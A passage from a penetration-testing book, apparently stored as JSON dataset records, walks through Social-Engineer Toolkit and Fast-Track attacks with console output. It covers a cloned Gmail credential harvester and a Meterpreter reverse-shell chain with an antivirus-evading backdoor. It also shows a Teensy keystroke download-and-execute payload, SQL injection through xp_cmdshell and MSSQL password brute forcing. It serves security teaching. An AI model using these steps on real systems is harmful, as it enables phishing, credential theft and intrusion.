parsers that you’re already using.\nThe Social-Engineer Toolkit 149\nFigure 10-3: Credential harvester report\nTabnabbing\nIn a tabnabbing scenario, a target is caught while accessing a website with\nmultiple tabs open. When the target clicks a link, he is presented with a\n“Please wait while the page loads” message. When the target switches tabs,\nthe website detects that a different tab has focus and rewrites the web page\nthat presented the “Please wait . . . ” message with a website you specify.\nEventually, the target clicks the tabnabbed tab, and, believing he is being\nasked to sign in to his email program or business application, he enters his\ncredentials into the malicious look-alike site. The credentials are harvested,\nand the target is redirected to the original website. You can access the tab-\nnabbing attack vector through SET’s web attack vector interface.\nMan-Left-in-the-Middle\nA man-left-in-the-middle attack uses HTTP referers on an already compromised\nsite or a cross-site scripting (XSS) vulnerability to pass the target’s credentials\nback to the HTTP server. If you find an XSS vulnerability and send the URL\nto the target, who then clicks the link, the website will operate normally,\nbutwhen the target logs into the system, his credentials are passed tothe\nattacker. The man-left-in-the-middle attack vector can be accessed through\nSET’s web attack vector interface.\n150 Chapter 10\nWeb Jacking\nThe web jacking attack method, new in SET version 0.7, allows you to create a\nwebsite clone, where the target is presented with a link stating that the web-\nsite has moved. When the target hovers over the link, the URL presented\nisthe real URL, not the attacker’s URL. So, for example, if you’re cloning\nhttps://gmail.com/, the URL that would appear on the target’s machine when\nhe hovers his mouse over the link would be https://gmail.com/. When the tar-\nget clicks the link, Gmail opens but is quickly replaced with your malicious\nweb server.\nThis attack uses a time-based iframe replacement. When the target hov-\ners over the link, it points to whatever site you cloned. When the target clicks\nthe link, the iframe replacement will initiate and replace the target’s browser\nwith the malicious cloned site without the target’s knowledge. You can change\nthe timing of a web jacking attack using the config/set_config flags.\nTo configure SET for the attack, select Web Jacking Attack Method (cid:88) and\nSite Cloner (cid:89), and then add the site you want to clone, https://gmail.com (cid:90),\nas shown below.\n(cid:88) 6. Web Jacking Attack Method\nEnter your choice (press enter for default): 6\n[!] Website Attack Vectors [!]\n(cid:89) 2. Site Cloner\nEnter number (1-4): 2\nSET supports both HTTP and HTTPS\nExample: http://www.thisisafakesite.com\n(cid:90) Enter the url to clone: https://gmail.com\n[*] Cloning the website: https://gmail.com\n[*] This could take a little bit...\nThe best way to use this attack is if username and password form\nfields are available. Regardless, this captures all POSTs on a website.\n[*] I have read the above message. [*]\nPress {return} to continue.\n[*] Web Jacking Attack Vector is Enabled...Victim needs to click the link.\nWhen the target visits the cloned site, he will see the link shown in\nFigure10-4. Notice that the URL at the lower-left corner shows https://\ngmail.com/.\nThe Social-Engineer Toolkit 151\nFigure 10-4: Initial page and link to the cloned page\nWhen the target clicks the link, he is presented with the cloned web\npage shown in Figure 10-5, which looks exactly like the real Gmail Wel-\ncome page.\nFigure 10-5: Cloned Gmail Welcome page\nNotice that the URL text at the top of Figure 10-5 shows our malicious\nweb server. As in preceding examples, you can register a similar domain\nname to avoid this issue. Once the target enters his username and password\nin the appropriate fields, you can intercept and harvest the credentials.\n152 Chapter 10\nPutting It All Together with a Multipronged Attack\nThe multi-attack web vector allows you to chain multiple web attack methods\ntogether to perform a single attack. The multi-attack vector allows you to\nturn on and off different vectors and combine the attacks into one web page.\nWhen the user clicks the link, he will be targeted by each of the attack vectors\nyou specify. A multipronged attack is particularly useful because, in some\ncases, the Java applet might fail, while a client-side Internet Explorer exploit\nwould succeed. Or, the Java applet and the Internet Explorer exploits might\nfail, but the credential harvester succeeds.\nIn the following example, we’ll use the Java applet attack, the Metasploit\nclient-side exploit, and the web jacking attack. When the target browses the\naffected site, he will be enticed to click the link and will then be bombarded\nwith a credential harvester, Metasploit exploits, and the Java applet attack.\nHere we’ll select an Internet Explorer 7 exploit and browse the target’s\nmachine using Internet Explorer 6 just to demonstrate how if one method\nfails, others can be used.\n1. The Java Applet Attack Method\n2. The Metasploit Browser Exploit Method\n3. Credential Harvester Attack Method\n4. Tabnabbing Attack Method\n5. Man Left in the Middle Attack Method\n6. Web Jacking Attack Method\n(cid:88) 7. Multi-Attack Web Method\n8. Return to the previous menu\nEnter your choice (press enter for default): 7\n[!] Website Attack Vectors [!]\n(cid:89) 2. Site Cloner\nEnter number (1-4): 2\n(cid:90) Enter the url to clone: https://gmail.com\nSelect which attacks you want to use:\n(cid:91) 1. The Java Applet Attack Method (OFF)\n(cid:92) 2. The Metasploit Browser Exploit Method (OFF)\n3. Credential Harvester Attack Method (OFF)\n4. Tabnabbing Attack Method (OFF)\n5. Man Left in the Middle Attack Method (OFF)\n(cid:93) 6. Web Jacking Attack Method (OFF)\n7. Use them all - A.K.A. 'Tactical Nuke'\n8. I'm finished and want to proceed with the attack.\n9. Return to main menu.\nEnter your choice one at a time (hit 8 or enter to launch): 1\nThe Social-Engineer Toolkit 153\nTurning the Java Applet Attack Vector to ON\nSelect which attacks you want to use:\nEnter your choice one at a time (hit 8 or enter to launch): 2\nTurning the Metasploit Client Side Attack Vector to ON\nOption added. Press {return} to add or prepare your next attack.\nSelect which attacks you want to use:\nEnter your choice one at a time (hit 8 or enter to launch): 6\nTurning the Web Jacking Attack Vector to ON\nSelect which attacks you want to use:\n. . . SNIP . . .\nEnter your choice one at a time (hit 8 or enter to launch):\nBegin configuring the attack by selecting Multi-Attack Web Method (cid:88)\nfromthe main menu, and then choose Site Cloner (cid:89) and enter the URL to\nclone, https://gmail.com (cid:90). Next, SET presents a menu of different attacks.\nSelect The Java Applet Attack Method (cid:91), then The Metasploit Browser Exploit\nMethod (cid:92), and finally, select Web Jacking Attack Method (cid:93). You could also select\noption 7, Use them all - A.K.A. 'Tactical Nuke' to enable all the attack vectors\nautomatically.\nIn the preceding example, notice that the flags have changed and that\nthe Java applet, Metasploit browser exploit, credential harvester, and web\njacking attack methods have all been enabled. To proceed, press ENTER or\nchoose option 8 (I'm finished...).\nEnter your choice one at a time (hit 8 or enter to launch):\nWhat payload do you want to generate:\nName: Description:\n(cid:88) 2. Windows Reverse_TCP Meterpreter Spawn a meterpreter shell on victim and send\nback to attacker.\nEnter choice (hit enter for default):\nBelow is a list of encodings to try and bypass AV.\nSelect one of the below, 'backdoored executable' is typically the best.\n(cid:89) 16. Backdoored Executable (BEST)\n154 Chapter 10\nEnter your choice (enter for default):\n[-] Enter the PORT of the listener (enter for default):\n[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...\n[-] Backdoor completed successfully. Payload is now hidden within a legit executable.\n********************************************************\nDo you want to create a Linux/OSX reverse_tcp payload\nin the Java Applet attack as well?\n********************************************************\n(cid:90) Enter choice yes or no: no\nEnter the browser exploit you would like to use\n(cid:91) 8. Internet Explorer 7 Uninitialized Memory Corruption (MS09-002)\nEnter your choice (1-12) (enter for default): 8\n[*] Cloning the website: https://gmail.com\n[*] This could take a little bit...\n[*] Injecting Java Applet attack into the newly cloned website.\n[*] Filename obfuscation complete. Payload name is: x5sKAzS\n[*] Malicious java applet website prepped for deployment\n[*] Injecting iframes into cloned website for MSF Attack....\n[*] Malicious iframe injection successful...crafting payload.\nresource (src/program_junk/meta_config)> exploit -j\n[*] Exploit running as background job.\nmsf exploit(ms09_002_memory_corruption) >\n[*] Started reverse handler on 172.16.32.129:443\n[*] Using URL: http://0.0.0.0:8080/\n[*] Local IP: http://172.16.32.129:8080/\n[*] Server started.\nTo complete the attack setup, select the default reverse Meterpreter\npayload (cid:88) along with default encoding and listening port (cid:89). Choose not to\nconfigure a Linux and OS X payload (cid:90), and then set the browser exploit to\nInternet Explorer 7 Uninitialized Memory Corruption (MS09-002) (cid:91); then SET\nwill launch the attack.\nOnce everything is running, you can browse to the website and see what’s\ngoing on there. A message URL tells you that the site has been moved. Please\nrefer to Figure 10-4 to see what the target will see on his machine.\nClick the link and the Metasploit exploit begins. Here’s the handler on\nthe backend:\n[*] Sending Internet Explorer 7 CFunctionPointer Uninitialized Memory\nCorruption to 172.16.32.131:1329...\nThis exploit fails, because we are using Internet Explorer 6. The target’s\nscreen is shown in Figure 10-6.\nThe Social-Engineer Toolkit 155\nFigure 10-6: Multi-attack security warning\nWe have a backup attack, however. The target clicks Run on the mali-\ncious Java applet, a Meterpreter shell begins, and the target is redirected\nback to the original Gmail page. The attack is successful.\nNotice that when using the Java applet, we automatically migrate to a sep-\narate thread (process) that happens to be notepad.exe. Because of this, if the\ntarget closes the browser, our attack will continue because the process won’t\nterminate our Meterpreter shell. Also, within the configuration file you can\nset the “Java Repeater” option, which will continue to prompt the target\nwith the Java applet warning even if he clicks Cancel. This makes it more\nlikely that the target will click the Run button.\nThe Meterpreter shell is presented to us once a successful exploit is per-\nformed, as shown below.\n[*] Sending stage (748544 bytes) to 172.16.32.131\n[*] Meterpreter session 1 opened (172.16.32.129:443 -> 172.16.32.131:1333) at\nThu Sep 09 12:33:20 -0400 2010\n[*] Session ID 1 (172.16.32.129:443 -> 172.16.32.131:1333) processing\nInitialAutoRunScript 'migrate -f'\n[*] Current server process: java.exe (824)\n[*] Spawning a notepad.exe host process...\n[*] Migrating into process ID 3044\n[*] New server process: notepad.exe (3044)\nmsf exploit(ms09_002_memory_corruption) >\nNow let’s say that this attack fails, and the target clicks Cancel (without\nthe repeater option enabled). He would then be prompted to enter his user-\nname and password into the username and password fields, allowing you to\nsuccessfully harvest the credentials on the website and still have a successful\n156 Chapter 10\nattack. While you wouldn’t have a Meterpreter shell, because the target didn’t\nclick Run, you would still be able to intercept the credentials:\n[*] WE GOT A HIT! Printing the output:\nPOSSIBLE USERNAME FIELD FOUND: Email=thisismyusername\nPOSSIBLE PASSWORD FIELD FOUND: Passwd=thisismypassword\n[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.\nAs you’ve seen in the preceding examples, you can see that SET offers a\nnumber of powerful web-based attack vectors in its arsenal. It can be difficult\nto persuade a target to think that a cloned site is legitimate. Most knowl-\nedgeable users are generally cautious about unfamiliar sites and try to avoid\npotential security issues as they browse the Internet. SET tries to leverage this\ncautiousness and, by letting you mimic a known website, fool even some of\nthe savviest technical folks.\nInfectious Media Generator\nThe Infectious Media Generator is a relatively simple attack vector. With this\nvector, SET creates a folder for you that you can either burn to a CD/DVD or\nstore on a USB thumb drive. The autorun.inf file is used, which, once inserted\ninto a target’s machine, will execute whatever you specify during attack cre-\nation. Currently, SET supports executables (such as Meterpreter) as well as\nfile-format bugs (such as Adobe exploits).\nTeensy USB HID Attack Vector\nThe Teensy USB HID (human interface device) attack vector is a remarkable\ncombination of customized hardware and restriction bypass via keyboard\nemulation. Traditionally, when you insert a CD/DVD or USB into your\ncomputer, if autorun is disabled, autorun.inf isn’t called and you can’t execute\nyour code automatically. However, using the Teensy USB HID, you can emu-\nlate a keyboard and mouse. When you insert the device, it will be detected as\na keyboard, and using the microprocessor and onboard flash memory storage,\nyou can send a very fast set of keystrokes to the target’s machine and com-\npletely compromise it, regardless of autorun. You can order a Teensy USB\nHID at http://www.prjc.com/.\nLet’s set up a Teensy USB HID to perform a WScript download of a\nMetasploit payload. In the following example, a small WScript file will be\nwritten that will download an executable and execute it. This will be our\nMetasploit payload, and it’s all handled through SET.\nSelect from the menu:\n(cid:88) 6. Teensy USB HID Attack Vector\nEnter your choice: 6\nThe Social-Engineer Toolkit 157\nWelcome to the Teensy HID Attack Vector.\nSpecial thanks to: IronGeek and WinFang\n1. Powershell HTTP GET MSF Payload\n(cid:89) 2. WSCRIPT HTTP GET MSF Payload\n3. Powershell based Reverse Shell\n4. Return to the main menu.\nEnter your choice: 2\n(cid:90) Do you want to create a payload and listener yes or no: yes\nWhat payload do you want to generate:\nName: Description:\n. . . SNIP . . .\n2. Windows Reverse_TCP Meterpreter Spawn a meterpreter shell on victim and send\nback to attacker.\n(cid:91) Enter choice (hit enter for default):\nBelow is a list of encodings to try and bypass AV.\nSelect one of the below, 'backdoored executable' is typically the best.\n. . . SNIP . . .\n16. Backdoored Executable (BEST)\n(cid:92) Enter your choice (enter for default):\n[-] Enter the PORT of the listener (enter for default):\n[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...\n[-] Backdoor completed successfully. Payload is now hidden within a legit executable\n[*] PDE file created. You can get it under 'reports/teensy.pde'\n[*] Be sure to select \"Tools\", \"Board\", and \"Teensy 2.0 (USB/KEYBOARD)\" in Arduino\nPress enter to continue.\n[*] Launching MSF Listener...\nresource (src/program_junk/meta_config)> exploit -j\n[*] Exploit running as background job.\nmsf exploit(handler) >\n[*] Started reverse handler on 0.0.0.0:443\n[*] Starting the payload handler...\nTo begin setting up this attack, choose Teensy USB HID Attack Vector (cid:88)\nfrom the main menu, and then choose WSCRIPT HTTP GET MSF Payload (cid:89). Then\ntell SET to set up a payload and listener (cid:90), selecting the default Meterpreter\npayload (cid:91) and encoding method (cid:92).\n158 Chapter 10\nNow that you have a .pde file, you will need to download and use the\nArduino interface, which is a graphical user interface for compiling the .pde\nfiles to be uploaded to your Teensy device.\nFor this attack, follow the instructions at PJRC (http://www.pjrc.com/) for\nuploading your code to the Teensy board. It’s relatively simple. You install\nthe Teensy loader and libraries. Then you’ll see an IDE (Integrated Drive\nElectronics) interface called Arduino. (Arduino/Teensy is supported on\nLinux, Mac OS X, and Windows operating systems.) One of the most impor-\ntant aspects of this is that you ensure that you set your board to a Teensy USB\nkeyboard/mouse, as show in Figure 10-7.\nFigure 10-7: Setting up the Teensy device\nAfter you have this selected, drag your .pde file into the Arduino inter-\nface. Insert your USB device into the computer and upload your code. This\nwill program your device with the SET-generated code. Figure 10-8 shows the\ncode being uploaded.\nAfter the programmed USB device is inserted into the target’s machine\nand the code is installed, you should see a Meterpreter shell:\n[*] Sending stage (748544 bytes) to 172.16.32.131\n[*] Meterpreter session 1 opened (172.16.32.129:443 -> 172.16.32.131:1333) at\nThu June 09 12:52:32 -0400 2010\n[*] Session ID 1 (172.16.32.129:443 -> 172.16.32.131:1333) processing\nInitialAutoRunScript 'migrate -f'\n[*] Current server process: java.exe (824)\n[*] Spawning a notepad.exe host process...\n[*] Migrating into process ID 3044\n[*] New server process: notepad.exe (3044)\nThe Social-Engineer Toolkit 159\nFigure 10-8: Teensy attack code upload\nAdditional SET Features\nWe won’t cover every aspect of the Social-Engineer Toolkit, but it does have\nsome particularly notable aspects. One tool of note is the SET Interactive\nShell: an interactive shell that can be selected as a payload instead of Meter-\npreter. Another feature is RATTE (Remote Administration Tool Tommy\nEdition), a full HTTP tunneling payload that was created by Thomas Werth.\nIt relies on HTTP-based communications and piggybacks proxy settings on\nthe target machine. RATTE is particularly useful when the target uses egress\nand packet inspection rules that can detect non-HTTP traffic. RATTE uses\nthe Blowfish encryption algorithm for communications to allow full encryp-\ntion over HTTP.\nTwo other tools include the SET Web-GUI (a full-fledged web applica-\ntion that automates several of the attacks discussed above) and the wireless\nattack vector. To run the SET Web-GUI, simply enter ./set-web from the SET\nhome folder. The Web-GUI is written in Python and is a great way to perform\n160 Chapter 10\nattacks through a web interface. The wireless attack vector creates a rogue\naccess point on the attacking machine. When the target connects to the access\npoint, any website he visits is redirected to the attacker machine, which can\nthen launch a number of SET attacks (such as harvester or the Java applet)\non the target.\nLooking Ahead\nLike Metasploit, SET is a work in progress. The security community has\nembraced the capabilities and potential of SET and continues to contribute\nto making it better. Social-engineering attacks are on the rise, so ensuring\nthat you can properly test these attack vectors is imperative for any compre-\nhensive security program.\nAs organizations and vendors get better at securing their network perim-\neters with software and hardware solutions, we often forget how easy it is to\ncall or email a user and convince him to click or download something that\ncan be used for an attack. Social engineering in general takes skill and practice,\nand a good attacker knows that he needs to ensure that the attack is specially\ncrafted to target weaknesses in his targets’ company user awareness programs\nor systems. A skilled attacker knows that spending a few days researching an\norganization, looking at Facebook or Twitter pages, and determining what\nmay trigger someone to click hastily is just as important as the tools used\nbehind the attack.\nTools like SET are useful to attackers, but always remember that as a\npenetration tester, your skill is defined by your creativity and your ability to\nnavigate difficult situations. SET will aid you in attacking your targets, but,\nultimately, if you fail, it’s probably because you weren’t creative enough.\nThe Social-Engineer Toolkit 161"
  },
  {
    "input": "What is Fast-Track and what are its main features and capabilities in the context of penetration testing?",
    "summary": "Fast-Track is an open-source Python tool that enhances penetration testing by integrating with the Metasploit Framework and offering additional features like Microsoft SQL attacks and browser exploits. It provides an interactive mode for customizing attacks and includes automated tools for SQL injection and brute-forcing SQL servers. The tool is maintained by Joey Furr and developed by Dave Kennedy, with contributions from other experts. Fast-Track simplifies complex tasks such as SQL injection, allowing users to gain system access quickly, while also supporting manual configuration and various payload delivery methods.",
    "output": "F A S T - T R A C K\nFast-Track is an open source Python-based tool for\naugmenting advanced penetration testing techniques.\nFast-Track uses the Metasploit Framework for payload\ndelivery and client-side attack vectors. It complements\nMetasploit by adding additional features, including\nMicrosoft SQL attacks, more exploits, and browser\nattack vectors. Fast-Track was created by Dave Kennedy,\nwith contributions from Andrew Weidenhamer, John\nMelvin, and Scott White. It is currently updated and\nmaintained by Joey Furr (j0fer).\nFast-Track’s interactive mode is the way to use it. To enter interactive\nmode, as shown below, use ./fast-track.py -i (which is similar to the com-\nmand used by SET). By issuing different options and sequences, you can cus-\ntomize your attack, targets, and more. (You can also use ./fast-track.py –g\ntoload the web interface.)\noot@bt4:/pentest/exploits/fasttrack# ./fast-track.py -i\n***********************************************\n******* Performing dependency checks... *******\n***********************************************\n*** FreeTDS and PYMMSQL are installed. (Check) ***\n*** PExpect is installed. (Check) ***\n*** ClientForm is installed. (Check) ***\n*** Psyco is installed. (Check) ***\n*** Beautiful Soup is installed. (Check) ***\n*** PyMills is installed. (Check) ***\nAlso ensure ProFTP, WinEXE, and SQLite3 is installed from\nthe Updates/Installation menu.\nYour system has all requirements needed to run Fast-Track!\nFast-Track Main Menu:\nFast-Track - Where it's OK to finish in under 3 minutes...\nVersion: v4.0\nWritten by: David Kennedy (ReL1K)\n1. Fast-Track Updates\n2. Autopwn Automation\n3. Microsoft SQL Tools\n4. Mass Client-Side Attack\n5. Exploits\n6. Binary to Hex Payload Converter\n7. Payload Generator\n8. Fast-Track Tutorials\n9. Fast-Track Changelog\n10. Fast-Track Credits\n11. Exit\nEnter the number:\nYou can see the general categories of attacks and features in Fast-Track’s\nmain menu above though we’ll only cover selected ones in this chapter.\nWe’llexplore some of the most useful tricks, with an emphasis on exploiting\nMicrosoft SQL. For example, the Autopwn Automation menu simplifies the\nprocess of Metasploit’s autopwn functionality—simply enter the IP address,\nand Fast-Track sets up everything for you. The Exploits menu contains addi-\ntional exploits not included in Metasploit.\nMicrosoft SQL Injection\nSQL injection (SQLi) attacks piggyback SQL commands to assault web applica-\ntions by exploiting insecure code. A SQL query can be inserted into the back-\nend database via a trusted web server to execute commands on the database.\nFast-Track automates the process of performing advanced SQL injection\n164 Chapter 11\nattacks by focusing on query string and POST parameters within web applica-\ntions. The following attack relies on the attacker knowing that SQL injection\nis present on the target website, and also knowing which parameter is vulner-\nable. This attack will work only on MS SQL–based systems.\nSQL Injector—Query String Attack\nBegin the setup for the attack by selecting Microsoft SQL Tools from the main\nmenu and then MSSQL Injector (cid:88), as shown below.\nPick a list of the tools from below:\n(cid:88) 1. MSSQL Injector\n2. MSSQL Bruter\n3. SQLPwnage\nEnter your choice : 1\nThe simplest form of SQL injection is within the query string, typically\nsent in the URL field from the browser to the server. This URL string can\noften contain parameters that inform a dynamic site what information is\nbeing requested. Fast-Track distinguishes which field to attack by inserting\nan 'INJECTHERE into the vulnerable query string parameter, like this:\nhttp://www.secmaniac.com/index.asp?id='INJECTHERE&date=2011\nWhen Fast-Track starts to exploit this vulnerability, it will look for the\nidstring in all fields to determine which field to attack. Let’s look at this in\naction by selecting the first option, Query String Parameter Attack.\nEnter which SQL Injector you want to use\n(cid:88) 1. SQL Injector - Query String Parameter Attack\n2. SQL Injector - POST Parameter Attack\n3. SQL Injector - GET FTP Payload Attack\n4. SQL Injector - GET Manual Setup Binary Payload Attack\nEnter your choice: 1\n. . . SNIP . . .\nEnter the URL of the susceptible site, remember to put 'INJECTHERE for the\ninjectable parameter\nExample:http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah\n(cid:89) Enter here: http://www.secmaniac.com/index.asp?id='INJECTHERE&date=2011\nSending initial request to enable xp_cmdshell if disabled...\nSending first portion of payload (1/4)...\nSending second portion of payload (2/4)...\nSending third portion of payload (3/4)...\nSending the last portion of the payload (4/4)...\nFast-Track 165\nRunning cleanup before executing the payload...\nRunning the payload on the server...Sending initial request to enable\nxp_cmdshell if disabled...\nSending first portion of payload (1/4)...\nSending second portion of payload (2/4)...\nSending third portion of payload (3/4)...\nSending the last portion of the payload (4/4)...\nRunning cleanup before executing the payload...\nRunning the payload on the server...\nlistening on [any] 4444 ...\nconnect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1041\nMicrosoft Windows [Version 5.2.3790]\n(C) Copyright 1985-2003 Microsoft Corp.\nC:\\WINDOWS\\system32>\nSuccess! Full access was granted to the system, all through SQL injection.\nNote that this attack will not succeed if parameterized SQL queries or\nstored procedures are in use. Note, too, that the required configuration\nforthis attack is very minimal. After selecting SQL Injector - Query String\nParameter Attack (cid:88) from the menu of attacks, you simply direct Fast-Track to\nthe point of SQL injection (cid:89). If the xp_cmdshell stored procedure is disabled,\nFast-Track will automatically re-enable it and attempt privilege escalation of\nMSSQL.\nSQL Injector—POST Parameter Attack\nFast-Track’s POST parameter attack requires even less configuration than\nthe preceding query string parameter attack. For this attack, simply pass Fast-\nTrack the URL of the website you want to attack, and it will automatically\ndetect the form to attack.\nEnter which SQL Injector you want to use\n1. SQL Injector - Query String Parameter Attack\n2. SQL Injector - POST Parameter Attack\n3. SQL Injector - GET FTP Payload Attack\n4. SQL Injector - GET Manual Setup Binary Payload Attack\nEnter your choice: 2\nThis portion allows you to attack all forms on a specific website without having to specify\neach parameter. Just type the URL in, and Fast-Track will auto SQL inject to each parameter\nlooking for both error based injection as well as blind based SQL injection. Simply type\nthe website you want to attack, and let it roll.\nExample: http://www.sqlinjectablesite.com/index.aspx\nEnter the URL to attack: http://www.secmaniac.com\nForms detected...attacking the parameters in hopes of exploiting SQL Injection..\n166 Chapter 11\nSending payload to parameter: txtLogin\nSending payload to parameter: txtPassword\n[-] The PAYLOAD is being delivered. This can take up to two minutes. [-]\nlistening on [any] 4444 ...\nconnect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1041\nMicrosoft Windows [Version 5.2.3790]\n(C) Copyright 1985-2003 Microsoft Corp.\nC:\\WINDOWS\\system32>\nAs you can see, Fast-Track handled the automatic detection of the POST\nparameters and injected the attack, completely compromising the affected\nsystem via SQL injection.\nNOTE You can also use FTP to deliver your payload, although FTP is generally blocked on\noutbound-based connections.\nManual Injection\nIf you have a different IP address listening for the reverse shell or you need\nto fine-tune some of the configuration settings, you can set up the injector\nmanually.\nEnter which SQL Injector you want to use\n1. SQL Injector - Query String Parameter Attack\n2. SQL Injector - POST Parameter Attack\n3. SQL Injector - GET FTP Payload Attack\n(cid:88) 4. SQL Injector - GET Manual Setup Binary Payload Attack\nEnter your choice: 4\nThe manual portion allows you to customize your attack for whatever reason.\nYou will need to designate where in the URL the SQL Injection is by using\n'INJECTHERE\nSo for example, when the tool asks you for the SQL Injectable URL, type:\nhttp://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah\nEnter the URL of the susceptible site, remember to put 'INJECTHERE for the\ninjectible parameter\nExample: http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah\n(cid:89) Enter here: http://www.secmaniac.com/index.asp?id='INJECTHERE&date=2010\n(cid:90) Enter the IP Address of server with NetCat Listening: 10.211.55.130\n(cid:91) Enter Port number with NetCat listening: 9090\nFast-Track 167\nSending initial request to enable xp_cmdshell if disabled....\nSending first portion of payload....\nSending second portion of payload....\nSending next portion of payload...\nSending the last portion of the payload...\nRunning cleanup...\nRunning the payload on the server...\nlistening on [any] 9090 ...\n10.211.55.128: inverse host lookup failed: Unknown server error : Connection\ntimed out\nconnect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1045\nMicrosoft Windows [Version 5.2.3790]\n(C) Copyright 1985-2003 Microsoft Corp.\nC:\\WINDOWS\\system32>\nFirst choose the manual option at (cid:88). Then, as in the query string param-\neter attack, point Fast-Track to the parameter vulnerable to SQL injection (cid:89)\nand input your listening IP address at (cid:90) along with the port you want your\ntarget to connect to at (cid:91). Fast-Track takes care of the rest.\nMSSQL Bruter\nPerhaps one of the best aspects of Fast-Track is the MSSQL Bruter (available\nfrom the Microsoft SQL Attack Tools menu). When MS SQL is installed,\nMSSQL Bruter can use integrated Windows authentication, SQL authentica-\ntion, or mixed-mode authentication.\nMixed-mode authentication allows users to be verified from Windows\nauthentication as well as directly from the MS SQL Server. If mixed-mode or\nSQL authentication is used during the installation of MS SQL, the adminis-\ntrator installing the software needs to specify an sa, or system administrator,\naccount for MS SQL. Often, administrators choose a weak, blank, or easily\nguessable password that can be used to an attacker’s advantage. If the sa\naccount can be brute forced, it will lead to a compromise of the entire sys-\ntem through the extended stored procedure xp_cmdshell.\nFast-Track uses a few methods for discovery when looking for MS SQL\nservers, including using nmap to perform port scans of the default MS SQL\nTCP port 1433. If the target machine is using MS SQL Server 2005 or later,\ndynamic port ranges can be used, which makes it more difficult to enumer-\nate, but Fast-Track directly interfaces with Metasploit and can look for port\n1434 User Datagram Protocol (UDP) to reveal which port MS SQL server’s\ndynamic port is running.\nOnce Fast-Track has identified a server and successfully brute forced the\nsa account, it will use advanced binary-to-hex conversion methods to deliver\napayload. This attack is usually highly successful, especially in large environ-\nments where MS SQL is widely used.\n168 Chapter 11\nHere’s the initial attack:\nMicrosoft SQL Attack Tools\nPick a list of the tools from below:\n1. MSSQL Injector\n2. MSSQL Bruter\n3. SQLPwnage\nEnter your choice : 2\nEnter the IP Address and Port Number to Attack.\nOptions: (a)ttempt SQL Ping and Auto Quick Brute Force\n(m)ass scan and dictionary brute\n(s)ingle Target (Attack a Single Target with big dictionary)\n(f)ind SQL Ports (SQL Ping)\n(i) want a command prompt and know which system is vulnerable\n(v)ulnerable system, I want to add a local admin on the box...\n(e)nable xp_cmdshell if its disabled (sql2k and sql2k5)\nAfter we select the MSSQL Bruter option, Fast-Track presents us with alist\nof various attacks that can be conducted. Not all of these will work in every\nsituation, or even serve the same purpose, so it is important to be sure that\nyou understand what is happening for each option.\nFast-Track has several options:\n(cid:122) Attempt SQL Ping and Auto Quick Brute Force attempts to scan a range\nof IP addresses using the same syntax as nmap and a built-in predefined\ndictionary list of about 50 passwords.\n(cid:122) Mass scan and dictionary brute scans a range of IP addresses and allows\nyou to specify a word list of your own. Fast-Track comes with a decent\nword list located at bin/dict/wordlist.txt.\n(cid:122) Single Target allows you to brute force one specific IP address with a\nlarge word list.\n(cid:122) Find SQL Ports (SQL Ping) only looks for SQL servers and will not\nattackthem.\n(cid:122) I want a command prompt . . . spawns a command prompt for you if you\nalready know the sa password.\n(cid:122) Vulnerable system . . . adds a new administrative user on a box that you\nknow to be vulnerable.\n(cid:122) Enable xp_cmdshell . . . is a stored procedure Fast-Track uses to execute\nunderlying system commands. By default, it is disabled in SQL Server\nversions 2005 and later, but Fast-Track can automatically re-enable it.\nWhen attacking a remote system with any option, Fast-Track will auto-\nmatically attempt to re-enable xp_cmdshell, just in case.\nFast-Track 169\nYou can use and customize several options to reach your target, the easi-\nest of which is the quick brute force, which will often go undetected. We’ll\nselect the quick brute force option using a subset of built-in passwords and\nattempt to guess the password on the MS SQL server.\nEnter the IP Address and Port Number to Attack.\n(cid:88) Options: (a)ttempt SQL Ping and Auto Quick Brute Force\n(m)ass scan and dictionary brute\n(s)ingle Target (Attack a Single Target with big dictionary)\n(f)ind SQL Ports (SQL Ping)\n(i) want a command prompt and know which system is vulnerable\n(v)ulnerable system, I want to add a local admin on the box...\n(e)nable xp_cmdshell if its disabled (sql2k and sql2k5)\nEnter Option: a\n(cid:89) Enter username for SQL database (example:sa): sa\nConfiguration file not detected, running default path.\nRecommend running setup.py install to configure Fast-Track.\nSetting default directory...\n(cid:90) Enter the IP Range to scan for SQL Scan (example 192.168.1.1-255):\n10.211.55.1/24\nDo you want to perform advanced SQL server identification on non-standard SQL\nports? This will use UDP footprinting in order to determine where the SQL\nservers are at. This could take quite a long time.\n(cid:91) Do you want to perform advanced identification, yes or no: yes\n[-] Launching SQL Ping, this may take a while to footprint.... [-]\n[*] Please wait while we load the module tree...\nBrute forcing username: sa\nBe patient this could take awhile...\nBrute forcing password of password2 on IP 10.211.55.128:1433\nBrute forcing password of on IP 10.211.55.128:1433\nBrute forcing password of password on IP 10.211.55.128:1433\nSQL Server Compromised: \"sa\" with password of: \"password\" on IP\n10.211.55.128:1433\nBrute forcing password of sqlserver on IP 10.211.55.128:1433\nBrute forcing password of sql on IP 10.211.55.128:1433\nBrute forcing password of password1 on IP 10.211.55.128:1433\nBrute forcing password of password123 on IP 10.211.55.128:1433\nBrute forcing password of complexpassword on IP 10.211.55.128:1433\nBrute forcing password of database on IP 10.211.55.128:1433\nBrute forcing password of server on IP 10.211.55.128:1433\nBrute forcing password of changeme on IP 10.211.55.128:1433\nBrute forcing password of change on IP 10.211.55.128:1433\nBrute forcing password of sqlserver2000 on IP 10.211.55.128:1433\nBrute forcing password of sqlserver2005 on IP 10.211.55.128:1433\n170 Chapter 11\nBrute forcing password of Sqlserver on IP 10.211.55.128:1433\nBrute forcing password of SqlServer on IP 10.211.55.128:1433\nBrute forcing password of Password1 on IP 10.211.55.128:1433\n. . . SNIP . . .\n*******************************************\nThe following SQL Servers were compromised:\n*******************************************\n1. 10.211.55.128:1433 *** U/N: sa P/W: password ***\n*******************************************\nTo interact with system, enter the SQL Server number.\nExample: 1. 192.168.1.32 you would type 1\nEnter the number:\nAfter selecting Attempt SQL Ping and Auto Quick Brute Force at (cid:88), you\nwill be prompted for a SQL database username (cid:89), followed by the range of\nIP addresses you want to scan at (cid:90). Answer yes when asked whether you want\nto perform 